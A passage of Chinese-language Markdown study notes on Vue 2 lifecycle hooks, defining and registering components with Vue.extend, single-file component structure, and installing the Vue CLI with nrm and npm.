				<h2>当前的n值是：{{n}}</h2>
				<button @click="add">点我n+1</button>
			</div>
		`, */
		data: {
			n: 1
		},
		methods: {
			add() {
				console.log('add')
				this.n++
			},
			bye() {
				console.log('bye');
				//销毁vue实例
				this.$destroy();
			}
		},
		
		watch: {
			n() {
				console.log('n变了')
			}
		},
		//创建流程：
		//创建是指初始化：数据检测，数据代理
		beforeCreate() {
			console.log('beforeCreate')
		},
		created() {
			console.log('created')
		},
		//挂载流程：
		//挂载之前，这时候vue还没渲染，虚拟dom还在内存中，所有对dom的操作最终都不奏效
		beforeMount() {
			console.log('beforeMount')
		},
		//TODO 挂载完毕，此时界面显示的是vue编译后的真实dom，
		//一般进行 开启定时器，发送网络请求，订阅消息，绑定自定义事件等初始化操作
		mounted() {
			//HTMLElement
			console.log('mounted',this.$el);
		},

        //更新流程:
		//更新之前，数据已经更新，页面还是旧的，数据和页面未同步
		beforeUpdate() {
			console.log('beforeUpdate')
		},
		//更新：数据和页面同步
		updated() {
			console.log('updated')
		},

		//销毁流程:
		//TODO 销毁之前，一般进行关闭定时器，取消订阅信息，解绑自定义事件等收尾操作
		beforeDestroy() {
			console.log('beforeDestroy')
		},
		destroyed() {
			console.log('destroyed')
		},
	})

	//如果没有写el绑定容器，那么得通过$mount绑定容器
	//vm.$mount('root');
</script>

```

##### template替换原容器

>不难发现 <div id="root">直接没有了 被覆盖了！！！

![image-20210824093520538](C:\Users\q\AppData\Roaming\Typora\typora-user-images\image-20210824093520538.png)



#### 12.2总结

>常用的生命周期钩子：
>
>​            1.mounted: 发送ajax请求、启动定时器、绑定自定义事件、订阅消息等【初始化操作】。
>
>​            2.beforeDestroy: 清除定时器、解绑自定义事件、取消订阅消息等【收尾工作】。
>
>关于销毁Vue实例：
>
>​            1.销毁后借助Vue开发者工具看不到任何信息。
>
>​            2.销毁后自定义事件会失效，但原生DOM事件依然有效。
>
>​            3.一般不会在beforeDestroy操作数据，因为即便操作数据，也不会再触发更新流程了。
>
>

### 13.组件

>组件：分为非单文件组件，单文件组件(推荐)
>
>非单文件组件：就是一个界面定义了多个组件
>
>单文件组件：一个文件就是一个组件 
>
>

#### 13.1非单文件组件

##### 13.1.1组件使用步骤

>第一步：创建组件，和定义一个Vue实例差不多，举例  const hello = new Vue.extend({   data(){ }   })
>
>​              细节：使用extend，不能定义el，data必须得函数式写法！
>
>第二步：注册组件，分为全局注册 局部注册，全局注册所有的vue实例都可以用，局部只能当前vue实例使用
>
>​             全局注册格式 Vue.component('组件名',组件变量名);   举例 Vue.component("Hello",hello)
>
>​             局部注册 new Vue({
>
>​                  components:{ Hello: hello}   //前者Hello代表使用组件时的组件名，后者是定义组件的变量名
>
>​             })
>
>第三步：使用组件 ， <Hello></Hello>
>
>

##### 13.1.2核心代码

```html
<body>
		<!-- 
			Vue中使用组件的三大步骤：
					一、定义组件(创建组件)
					二、注册组件
					三、使用组件(写组件标签)

			一、如何定义一个组件？
						使用Vue.extend(options)创建，其中options和new Vue(options)时传入的那个options几乎一样，但也有点区别；
						区别如下：
								1.el不要写，为什么？ ——— 最终所有的组件都要经过一个vm的管理，由vm中的el决定服务哪个容器。
								2.data必须写成函数，为什么？ ———— 避免组件被复用时，数据存在引用关系。
						备注：使用template可以配置组件结构。

			二、如何注册组件？
							1.局部注册：靠new Vue的时候传入components选项
							2.全局注册：靠Vue.component('组件名',组件)

			三、编写组件标签：
							<school></school>
		-->
		<!-- 准备好一个容器-->
		<div id="root">
			<!-- 使用hello组件 -->
			<hello></hello>
			<hr>
			<h1>{{msg}}</h1>
			<hr>
			<!-- 第三步：编写组件标签 -->
			<school></school>
			<hr>
			<!-- 第三步：编写组件标签 -->
			<student></student>
		</div>

		<div id="root2">
			<hello></hello>
		</div>
	</body>

	<script type="text/javascript">
		Vue.config.productionTip = false

		//第一步：创建school组件
		const school = Vue.extend({
			template:`
				<div class="demo">
					<h2>学校名称：{{schoolName}}</h2>
					<h2>学校地址：{{address}}</h2>
					<button @click="showName">点我提示学校名</button>	
				</div>
			`,
			// el:'#root', //TODO 组件定义时，一定不要写el配置项，因为最终所有的组件都要被一个vm管理，由vm决定服务于哪个容器。
			//data得使用函数式写法，因为用对象式，别人使用这个组件存在对象引用地址调用，无法将每个人的数据分割开来
			data(){
				return {
					schoolName:'尚硅谷',
					address:'北京昌平'
				}
			},
			methods: {
				showName(){
					alert(this.schoolName);
				}
			},
		})
         
		//第一步：创建student组件
		const student = Vue.extend({
			template:`
				<div>
					<h2>学生姓名：{{studentName}}</h2>
					<h2>学生年龄：{{age}}</h2>
				</div>
			`,
			data(){
				return {
					studentName:'张三',
					age:18
				}
			},
		
		})
		
		//第一步：创建hello组件
		const hello = Vue.extend({
			template:`
				<div>	
					<h2>你好啊！{{name}}</h2>
				</div>
			`,
			data(){
				return {
					name:'Tom'
				}
			}
		})
		
		//第二步：全局注册组件
		Vue.component('hello',hello);

		//创建vm
		new Vue({
			el:'#root',
			data:{
				msg:'你好啊！'
			},
			//第二步：注册组件（局部注册）
			components:{
				school,
				student
			}
		})

		new Vue({
			el:'#root2',
		})
```

##### 13.1.3注意点

>0.定义组件
>
>​              使用extend关键字    不能设置el    data必须函数式写法
>
>1.关于组件名:
>
>​                一个单词组成：
>
>​                      第一种写法(首字母小写)：school
>
>​                      第二种写法(首字母大写)：School
>
>​                多个单词组成：
>
>​                      第一种写法(kebab-case命名)：my-school
>
>​                      第二种写法(CamelCase命名)：MySchool (需要Vue脚手架支持)
>
>​                备注：
>
>​                    (1).组件名尽可能回避HTML中已有的元素名称，例如：h2、H2都不行。
>
>​                    (2).可以使用name配置项指定组件在开发者工具中呈现的名字。
>
>  2.关于组件标签:
>
>​                第一种写法：<school></school>
>
>​                第二种写法：<school/>
>
>​                备注：不用使用脚手架时，<school/>会导致后续组件不能渲染。
>
>  3.简写方式：
>
>​                const school = Vue.extend(options) 可简写为：const school = options
>
>

##### 13.1.4VueComponent

```javascript
//组件本质是一个 VueComponent 构造函数
console.dir(hello); //dir可以打印构造函数的详情
```

###### 效果图

![image-20210824100745398](C:\Users\q\AppData\Roaming\Typora\typora-user-images\image-20210824100745398.png)

###### 解释

>关于VueComponent：
>
>​            1.hello组件本质是一个名为VueComponent的构造函数，且不是程序员定义的，是Vue.extend生成的。
>
>​            2.我们只需要写<Hello/>或<Hello></Hello>，Vue解析时会帮我们创建school组件的实例对象，这个实例对象就是名为VueComponent的构造函数实例对象
>
>​              即Vue帮我们执行的：new VueComponent(options)。options就是我们写的配置对象
>
>
>
>​            3.特别注意：每次调用Vue.extend，返回的都是一个全新的VueComponent！！！！
>
>
>
>​            4.关于this指向：
>
>​                (1).组件配置中：
>
>​                      data函数、methods中的函数、watch中的函数、computed中的函数 它们的this均是【VueComponent实例对象】。
>
>​                (2).new Vue(options)配置中：
>
>​                      data函数、methods中的函数、watch中的函数、computed中的函数 它们的this均是【Vue实例对象】。
>
>
>
>​            5.VueComponent的实例对象，以后简称vc（也可称之为：组件实例对象）。
>
>​              Vue的实例对象，以后简称vm。
>
>

##### 13.1.5内置关系

> 1.一个重要的内置关系：VueComponent.prototype.__ proto __ === Vue.prototype
>
>2.为什么要有这个关系：让组件实例对象（vc）可以访问到 Vue原型上的属性、方法。
>
>

#### 13.2单文件组件格式(推荐)

##### 13.2.1必须借助脚手架

>实例文件只是大致的运行流程，仅供参考，实际运行不起来！！！
>
>

##### 13.2.2 实例文件(不能运行)

###### 13.2.2.1所需文件

![image-20210824101839027](C:\Users\q\AppData\Roaming\Typora\typora-user-images\image-20210824101839027.png)

>School.vue   Student.vue   是组件，写一个即可
>
>App.vue是主组件，用于注册这些组件
>
>index.html是主界面，基本上不做修改，就是放一个<div id="root"></div>
>
>main.js 是 Vue实例，用于注册App组件，设置div容器
>
>

School.vue   

```vue
<template>
  <!-- TODO 组件的结构 -->
  <div class="demo">
    <h2>学校名称：{{ schoolName }}</h2>
    <h2>学校地址：{{ address }}</h2>
    <button @click="showName">点我提示学校名</button>
  </div>
</template> 

<script>
// TODO 组件交互的代码(数据，方法等等)
//第一种：多行暴露 export 
const school = Vue.extend({
  //给组件一个名称,没什么影响
  name:'School',
  data() {
    return {
      schoolName: "尚硅谷",
      address: "北京昌平",
    };
  },
  methods: {
    showName() {
      alert(this.schoolName);
    },
  },
});
//第二种：统一暴露
/* export{
    school,
} */
//第三种：默认暴露
export default school;      // 对于默认暴露引入简单  imort xx from XX
                            // 对于其他暴露    import{xx} from XX
</script>

<style>
/* TODO 组件的样式 */
    .demo{
        background-color:gary
    }
</style>

```



App.vue

```vue
<template>
  <div>
    <School></School>
    <Student></Student>
  </div>
</template>

<script>
//引入组件
import School from "./School.vue";
import Student from "./Student.vue";
export default {
  name: "App",
  comments: {
    //前面的名字决定组件名
    School: School,  Student,
  },
};
</script>

<style>
</style>
```

main.js

```javascript
//导入App主组件
import App from './App.vue';

//创建vue实例，为html的容器服务
const vm = new Vue({
    el: '#root',
    template:`<App></App>`,
    comments: {App}
});
```

index.html

```html
<body>
    <div id="root"></div>    
    <script src="../../js/vue.js"></script>
    <!-- 引入main.js -->
    <script src="./main.js"></script>
</body
```



### $14.安装脚手架

#### nrm的使用

  参考   https://www.cnblogs.com/gaozejie/p/10694834.html

> 先安装nrm    nrm是一个npm源管理工具，使用它可以快速切换npm源。
>
> ```mysql
> -- 下载nrm
> npm install -g nrm
> -- 查看所有源
> nrm ls 
> -- 使用taobao源，切换npm源
> nrm use taobao
> -- 测试源的速度
> nrm test taobao
> ```

![image-20210822221532987](C:\Users\q\AppData\Roaming\Typora\typora-user-images\image-20210822221532987.png)   

> -- 下载脚手架
>
> npm install -g @vue/cli
>
> -- 如出现下载缓慢请配置 npm 淘宝镜像：
>
> npm config set registry  https://registry.npm.taobao.org

![image-20210821161524022](C:\Users\q\AppData\Roaming\Typora\typora-user-images\image-20210821161524022.png)

如果之前安装过，版本比较低，需要卸载参考 https://blog.csdn.net/manmanwei/article/details/107686844

安装完成以后  参考版本号

![image-20210821165339770](C:\Users\q\AppData\Roaming\Typora\typora-user-images\image-20210821165339770.png)



## ②高级





